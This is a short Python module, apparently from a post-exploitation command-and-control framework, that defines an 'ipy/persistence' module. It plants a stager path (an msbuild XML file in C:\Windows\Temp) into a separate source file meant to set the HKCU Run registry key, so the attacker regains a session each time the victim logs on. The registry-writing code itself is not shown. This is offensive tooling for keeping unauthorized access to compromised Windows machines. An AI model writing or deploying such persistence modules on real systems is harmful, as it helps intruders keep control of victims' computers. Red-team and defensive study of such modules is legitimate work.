class STModule:
    def __init__(self):
        self.name = 'ipy/persistence'
        self.language = 'ipy'
        self.description = 'Set a new value in HKCU\...\Run registry key to get a session each time the user connects (works only with msbuild)'
        self.author = '@maximemf'
        self.options = {
            'Path': {
                'Description'   :   'Path to the stager file',
                'Required'      :   True,
                'Value'         :   "C:\\\\WINDOWS\\\\Temp\\\\msbuild.xml"
            }
        }

    def payload(self):
        with open('modules/ipy/src/persistence.py', 'r') as module_src:
            src = module_src.read()
            src = src.replace('PATH', self.options['Path']['Value'])
            return src
